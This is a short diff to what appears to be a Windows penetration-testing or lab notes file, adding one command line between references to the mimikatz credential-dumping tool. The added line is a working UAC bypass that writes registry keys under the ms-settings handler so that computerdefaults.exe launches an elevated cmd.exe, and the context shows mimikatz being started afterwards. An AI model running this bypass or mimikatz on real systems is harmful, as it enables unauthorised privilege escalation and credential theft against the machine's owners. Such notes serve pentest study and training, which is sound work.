@@ -892,6 +892,8 @@ Attempting to start cmd as user "SRV01\mcharles" ...
 ```
 [minikatz.exe](https://github.com/ParrotSec/mimikatz/tree/master/x64)
 ```
+C:\Windows\system32>reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
+
 C:\Users\Administrator\Desktop> mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
